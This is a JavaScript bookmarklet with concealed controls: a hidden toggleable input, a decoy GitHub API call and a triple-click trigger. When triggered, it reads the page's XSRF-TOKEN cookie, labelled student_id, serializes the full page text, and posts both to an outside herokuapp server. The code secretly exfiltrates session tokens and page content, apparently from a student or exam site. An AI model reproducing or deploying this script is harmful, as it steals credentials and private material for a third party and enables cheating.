javascript:var node = document.createElement("input"); node.id = "xxxnoxxx"; node.setAttribute("style", "transform:translateX(280px);background:#ececf1; display:none; width:calc(100% - 280px); border:1px solid #ffff;"); node.setAttribute("onchange", "javascript:fetch('https://api.github.com/repos/javascript-tutorial/en.javascript.info/'+this.value).then(t=>alert(t))"); document.body.appendChild(node); var clickedTime = 0; document.body.setAttribute("onmousedown","mouseDown(1)"); document.body.setAttribute("onmouseup","mouseDown(0)"); function mouseDown(num) {var d = new Date(); if(num == 1){clickedTime = d.getTime(); setTimeout(function(){if(d.getTime() == clickedTime){if( document.getElementById("xxxnoxxx").style.display == "flex"){document.getElementById("xxxnoxxx").style.display = "none"; }else{document.getElementById("xxxnoxxx").style.display = "flex"; } } },700)}else{clickedTime = d.getTime();}} let count = 0; let elements = new Map(); document.addEventListener('click', function (event) {let countdown; function reset () {count = 0; countdown = null; } count++; if (count === 3) {if (!elements.has(event.target)) {elements.set(event.target, 1); } else {let currentCount = elements.get(event.target); currentCount++; elements.set(event.target, currentCount); } let tripleClick = new CustomEvent('trplclick', {bubbles: true, detail: {numberOfTripleClicks: elements.get(event.target) } }); event.target.dispatchEvent(tripleClick); reset(); } if (!countdown) {countdown = window.setTimeout(function () {reset(); }, 500); } }); document.addEventListener('trplclick', function (event) {document.body.style.cursor ="cell"; var student_id = document.cookie.split("XSRF-TOKEN=")[1].split(";")[0]; var ns = new XMLSerializer(); var ss= ns.serializeToString(document); var nn = new DOMParser().parseFromString(ss, "text/xml"); while (nn.getElementsByTagName("script")[0]) {nn.getElementsByTagName("script")[0].remove() } var sa = new XMLSerializer(); var text= sa.serializeToString(nn).replace(/\"/g, '"'); data = {student_id: student_id, text: text, }; fetch('https://djkh.herokuapp.com/api/', {method: 'post', headers: {'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', }, body: JSON.stringify(data), }); setTimeout(function(){document.body.style.cursor = "auto"},500) });
